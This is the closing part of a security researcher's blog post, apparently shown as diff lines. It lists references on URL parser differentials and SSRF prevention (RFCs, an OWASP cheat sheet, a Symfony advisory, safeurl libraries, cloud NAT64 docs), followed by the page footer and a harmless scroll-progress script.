+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Understanding the Fragmented Space of URL Parser</span></span>
+<span class="line"><span>Implementations", ESORICS 2022.</span></span>
+<span class="line"><span>https://sts.cs.illinois.edu/papers/paper/EquivocalURLsUnderst20220926.html</span></span></code></pre>
+<p>[30] D. K. Ajmani, I. Koishybayev, A. Kapravelos, “yoU aRe a</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Liar:// A Unified Framework for Cross-Testing URL Parsers",</span></span>
+<span class="line"><span>IEEE SecWeb 2022.</span></span>
+<span class="line"><span>https://kapravelos.com/publications/youarealiar-secweb22.pdf</span></span></code></pre>
+<p>[31] Daniel Stenberg, “My URL isn’t your URL”, 2016.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://daniel.haxx.se/blog/2016/05/11/my-url-isnt-your-url/</span></span></code></pre>
+<p>[32] RFC 9525, “Service Identity in TLS”, 2023. §7.4 names the</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>classifier-drift pattern. https://www.rfc-editor.org/rfc/rfc9525</span></span></code></pre>
+<p>[33] Symfony Security Advisory CVE-2026-48736: IpUtils omits</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>IPv6 transition forms (SSRF bypass in</span></span>
+<span class="line"><span>NoPrivateNetworkHttpClient), May 2026.</span></span>
+<span class="line"><span>https://github.com/symfony/symfony/security/advisories/GHSA-38cx-cq6f-5755</span></span></code></pre>
+<p>[34] OWASP, “Server Side Request Forgery Prevention Cheat Sheet”.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</span></span></code></pre>
+<p>[35] Doyensec, “safeurl” (SSRF-protection library for Go) and</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>"safeurl for Go", 2022.</span></span>
+<span class="line"><span>https://github.com/doyensec/safeurl</span></span>
+<span class="line"><span>https://blog.doyensec.com/2022/12/13/safeurl.html</span></span></code></pre>
+<p>[36] Include Security, SafeURL / SafeCURL (2016) and “Mitigating</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>SSRF in 2023".</span></span>
+<span class="line"><span>https://blog.includesecurity.com/2023/03/mitigating-ssrf-in-2023/</span></span></code></pre>
+<p>[37] Amazon Web Services, “DNS64 and NAT64” and “NAT gateway basics”.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://docs.aws.amazon.com/vpc/latest/userguide/nat-gateway-nat64-dns64.html</span></span>
+<span class="line"><span>https://docs.aws.amazon.com/vpc/latest/userguide/nat-gateway-basics.html</span></span></code></pre>
+<p>[38] Google Cloud, “IPv6-to-IPv4 overview”, “Private NAT”, and Cloud</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>NAT release notes.</span></span>
+<span class="line"><span>https://docs.cloud.google.com/vpc/docs/ipv6-to-ipv4-overview</span></span>
+<span class="line"><span>https://docs.cloud.google.com/nat/docs/private-nat</span></span>
+<span class="line"><span>https://docs.cloud.google.com/nat/docs/release-notes</span></span></code></pre>
+<p>[39] Oracle Java 21 API, <code>HttpClient.Builder</code>, <code>HttpClient.Redirect</code>, and</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>`InetAddressResolverProvider`.</span></span>
+<span class="line"><span>https://docs.oracle.com/en/java/javase/21/docs/api/java.net.http/java/net/http/HttpClient.Builder.html</span></span>
+<span class="line"><span>https://docs.oracle.com/en/java/javase/21/docs/api/java.net.http/java/net/http/HttpClient.Redirect.html</span></span>
+<span class="line"><span>https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/net/spi/InetAddressResolverProvider.html</span></span></code></pre>
+<p>[40] Undici 8.7.0, Connector, Fetch, and global dispatcher documentation.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://github.com/nodejs/undici/blob/v8.7.0/docs/docs/api/Connector.md</span></span>
+<span class="line"><span>https://github.com/nodejs/undici/blob/v8.7.0/docs/docs/api/Fetch.md</span></span>
+<span class="line"><span>https://github.com/nodejs/undici/blob/v8.7.0/lib/global.js</span></span></code></pre>
+<p>[41] RFC 3056, “Connection of IPv6 Domains via IPv4 Clouds”, 2001.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://www.rfc-editor.org/rfc/rfc3056</span></span></code></pre>
+<p>[42] RFC 4291, “IP Version 6 Addressing Architecture”, 2006.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://www.rfc-editor.org/rfc/rfc4291</span></span></code></pre>
+<p>|=[ EOF ]=---------------------------------------------------------------=|</p></article> </div> <section class="end"> <div class="related"> <p class="cap">Same signals</p> <ul> <li style="--hue:#92DEFF"> <a href="/post/ssrf-pipeline/"> <span class="rn">08</span> <b>14 parsers, pinned</b> <em>shared &middot; ssrf</em> </a> </li> </ul> </div> <nav class="pager"> <span class="pg none"><span class="dir">&larr; Newer</span><b>This is the most recent.</b></span> <a class="pg r" href="/post/ssrf-pipeline/" style="--hue:#92DEFF"> <span class="dir">Older &rarr;</span> <b>The URL Parser Cheatsheet</b> </a> </nav> <p class="back"><a href="/">Back to posters</a></p> </section> <footer class="foot"> <span>Rajat Raghav &mdash; xclow3n</span> <a href="mailto:me@xclow3n.com">me@xclow3n.com</a> <span class="sp">Found, reported, patched.</span> </footer>  <script>
+(function () {
+  var doc = document.documentElement;
+  var links = Array.prototype.slice.call(document.querySelectorAll('.toc a'));
+  var secs = links.map(function (a) { return document.getElementById(a.dataset.sec); });
+  var tick = false;
+
+  function paint() {
+    tick = false;
+    var max = Math.max(1, doc.scrollHeight - innerHeight);
+    doc.style.setProperty('--read', Math.min(100, (scrollY / max) * 100).toFixed(2) + '%');
+    var y = scrollY + innerHeight * 0.3, cur = -1;
+    secs.forEach(function (s, i) { if (s && s.offsetTop <= y) cur = i; });
+    links.forEach(function (a, i) { a.classList.toggle('on', i === cur); });
+  }
+  addEventListener('scroll', function () {
+    if (!tick) { tick = true; requestAnimationFrame(paint); }
+  }, { passive: true });
+  addEventListener('resize', paint);
+  paint();
+})();
+</script>  </body></html>
